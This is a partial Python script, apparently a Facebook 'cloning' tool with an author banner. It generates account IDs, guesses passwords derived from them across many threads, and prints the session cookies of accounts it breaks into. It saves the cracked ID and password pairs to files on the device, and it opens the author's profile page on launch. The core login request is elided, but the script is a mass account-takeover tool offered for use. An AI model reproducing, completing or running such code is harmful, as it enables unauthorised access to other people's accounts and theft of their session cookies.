...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=61550641133297')
logo =("""\033[0;92m
...
╔══════════════════════════════════════════╗🖤"
║𝘼𝙐𝙏𝙃𝙊𝙍  : 𝙈𝙍. 𝘼𝙕𝙃𝘼𝙍
║𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋   : 03141616323
║𝙇𝙊𝙑𝙀𝙍: 𝙎𝙀𝙀𝙍𝘼𝙏 𝙓 𝘼𝙕𝙃𝘼𝙍
║𝙑𝙀𝙍𝙎𝙄𝙊𝙉  : 4.0.1                       
╚══════════════════════════════════════════╝💔"\033[1;31m
    """) 
loop = 0
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mAzhar Super Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[AZHAR-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AZHAR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/AZHAR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}AZHAR{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
